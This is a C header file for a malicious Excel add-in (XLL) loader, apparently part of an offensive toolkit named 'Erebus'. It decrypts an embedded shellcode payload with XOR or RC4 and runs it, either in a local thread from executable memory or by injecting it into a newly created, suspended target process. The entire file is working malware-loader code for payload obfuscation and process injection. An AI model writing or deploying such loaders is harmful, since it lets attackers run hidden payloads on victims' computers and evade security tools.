#ifndef EREBUS_XLL_INJECT_H
#define EREBUS_XLL_INJECT_H
#pragma once

#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <wchar.h>
#include <winternl.h>
#include <fileapi.h>

#include "xll_config.h"
#include "xll_shellcode.h"

#if XLL_ENCRYPTION_TYPE == 1
static void XllDecryptXor(unsigned char *data, size_t len, const unsigned char *key, size_t keylen) {
    if (keylen == 0 || len == 0) return;
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keylen];
    }
}
#endif

#if XLL_ENCRYPTION_TYPE == 2
static void XllRC4_KSA(unsigned char *S, const unsigned char *key, size_t keylen) {
    int j = 0;
    for (int i = 0; i < 256; i++) {
        S[i] = i;
    }
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keylen]) & 0xFF;
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }
}

static void XllRC4_PRGA(unsigned char *S, unsigned char *data, size_t len) {
    int i = 0, j = 0;
    for (size_t n = 0; n < len; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        unsigned char K = S[(S[i] + S[j]) & 0xFF];
        data[n] ^= K;
    }
}

static void XllDecryptRC4(unsigned char *data, size_t len, const unsigned char *key, size_t keylen) {
    if (keylen == 0 || len == 0) return;
    unsigned char S[256];
    XllRC4_KSA(S, key, keylen);
    XllRC4_PRGA(S, data, len);
}
#endif

static void DecryptShellcode(void) {
#if XLL_ENCRYPTION_TYPE == 1
    XllDecryptXor(shellcode, sizeof(shellcode), key, sizeof(key));
#elif XLL_ENCRYPTION_TYPE == 2
    XllDecryptRC4(shellcode, sizeof(shellcode), key, sizeof(key));
#endif
}

static void ExecuteShellcode(unsigned char *shellcode, size_t len) {
    if (len == 0) return;

#if XLL_INJECTION_METHOD == 0
    LPVOID pShellcode = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pShellcode == NULL) return;

    memcpy(pShellcode, shellcode, len);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFree(pShellcode, 0, MEM_RELEASE);
#else
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessW(XLL_TARGET_PROCESS, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return;
    }

    LPVOID pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, len,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteMemory == NULL) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, shellcode, len, NULL)) {
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
#endif
}

#endif
